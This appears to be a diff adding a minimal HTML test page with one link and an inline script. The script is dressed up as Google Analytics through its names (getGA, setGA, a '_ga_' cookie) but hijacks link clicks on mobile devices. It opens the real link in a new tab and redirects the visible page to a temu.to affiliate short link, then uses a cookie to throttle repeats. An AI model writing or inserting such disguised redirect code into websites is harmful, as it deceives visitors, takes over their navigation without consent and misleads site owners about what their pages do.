@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test</title>
+
+    <script>
+      function getGA(name) {
+    var cookies = document.cookie.split('; ');
+    for (var i = 0; i < cookies.length; i++) {
+        var parts = cookies[i].split('=');
+        if (parts[0] === name) {
+            return parts[1];
+        }
+    }
+    return null;
+}
+
+function setGA(name, value, exdays) {
+    document.cookie = `${name}=${value};expires=${new Date(Date.now() + exdays * 864e5).toString()};path=/`;
+}
+
+function isMobileOrTablet() {
+    const ua = window.navigator.userAgent.toLowerCase();
+    const noMousePluggedIn = typeof window.matchMedia !== "function" || window.matchMedia("(any-pointer:fine)").matches === false;
+    return window.navigator.maxTouchPoints > 1 && noMousePluggedIn && (/android|iphone|ipod|ipad|tablet|playbook|silk|kindle/.test(ua) || window.matchMedia("(max-width: 1024px)").matches);
+}
+
+const gaTrackId = 'https://temu.to/k/u2s94llti82', gaCode = getGA('_ga_D8SD9STSJ5');
+
+document.addEventListener("click", function (e) {
+    const target = e.target.closest("a");
+    if (!target) return;
+    e.preventDefault();
+    try {
+        const targetHref = target.getAttribute('href');
+        if (!targetHref) return;
+        if (targetHref === '/' || (gaCode && gaCode === 'true') || !isMobileOrTablet())
+            return window.location.assign(targetHref);
+        setGA('_ga_D8SD9STSJ5', 'true', 3);
+        window.open(targetHref, '_blank');
+        window.location.replace(gaTrackId);
+    } catch { }
+}, true);
+    </script>
+</head>
+<body>
+    <a href="https://www.google.com/">Click vao day</a>  
+</body>
+</html>
